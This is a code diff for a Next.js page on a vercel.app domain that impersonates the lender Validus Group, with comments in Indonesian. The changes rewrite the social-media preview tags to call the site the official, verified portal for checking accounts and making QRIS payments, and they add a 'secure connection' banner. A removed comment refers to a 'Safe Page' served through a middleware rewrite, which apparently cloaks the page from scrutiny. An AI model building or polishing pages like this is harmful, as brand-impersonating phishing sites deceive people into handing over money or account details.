@@ -1,16 +1,20 @@
 // app/page.js
+// Repositori: aksesmembership
+
 // -----------------------------------------------------------
-// Bagian 1: Metadata (Untuk OG Tags & SEO)
+// Bagian 1: Metadata (OG Tags, Judul Halaman)
 // Next.js akan membaca bagian ini untuk mengisi tag <head>
 // -----------------------------------------------------------
 export const metadata = {
     title: "Validus Group - Access Platform",
     description: "Akses portal, cek rekening terbaru, dan lakukan pembayaran QRIS di sini.",
     
+    // Open Graph (OG) Tags untuk WhatsApp & Facebook
     openGraph: {
-        title: "Validus Capital - Access Platform",
-        description: "Validus Group is the largest SME lending platform in South East Asia, operating in several countries across the region.",
+        title: "Validus Group: Portal Akses Resmi dan Terverifikasi",
+        description: "Sistem Akses Cepat dan Aman. Cek Update Rekening Terbaru Anda secara Realtime di Platform Resmi Validus Group.",
         url: 'https://aksesmembership.vercel.app/validus/',
+        siteName: 'Validus Group',
         images: [
             {
                 url: 'https://validusgrp.com/wp-content/uploads/2022/04/validus-capital-logo-red.png', 
@@ -21,16 +25,22 @@ export const metadata = {
         ],
         type: 'website',
     },
-    // ... (Tambahkan Twitter metadata jika perlu)
+    
+    // Twitter Card Tags
+    twitter: {
+        card: 'summary_large_image',
+        title: 'Validus Group: Portal Akses Resmi dan Terverifikasi',
+        description: 'Sistem Akses Cepat dan Aman. Cek Update Rekening Terbaru Anda secara Realtime di Platform Resmi Validus Group.',
+        images: ['https://validusgrp.com/wp-content/uploads/2022/04/validus-capital-logo-red.png'],
+    },
 };
 
 // -----------------------------------------------------------
-// Bagian 2: Komponen React (Merender Konten HTML Anda)
-// Kode ini akan merender Safe Page saat middleware me-rewrite ke '/'
+// Bagian 2: Komponen React (Merender Konten Halaman Aman)
 // -----------------------------------------------------------
 export default function Home() {
     return (
-        // Kode HTML Anda diubah menjadi JSX di sini
+        // Kode HTML Anda diubah menjadi JSX dan Inline CSS
         <div style={{
             fontFamily: 'sans-serif', 
             textAlign: 'center', 
@@ -45,7 +55,7 @@ export default function Home() {
                 maxWidth: '600px', 
                 margin: 'auto'
             }}>
-                <p style={{color: 'green', fontSize: '14px', marginBottom: '15px'}}><span style={{marginRight: '5px'}}>🔒</span>Koneksi Aman, Transaksi Dilindungi.</p>
+                <p style={{color: 'green', fontSize: '14px', marginBottom: '15px'}}><span style={{marginRight: '5px'}}>🔒</span>**Koneksi Aman, Transaksi Dilindungi.**</p>
                 <h1 style={{ color: '#cc0000', fontSize: '24px' }}>Portal Informasi Resmi</h1>
                 
                 <img 
@@ -66,5 +76,3 @@ export default function Home() {
         </div>
     );
 }
-
-// Catatan: Karena Anda sudah mengatur <style> di kode HTML Anda, saya mengubahnya menjadi inline CSS.
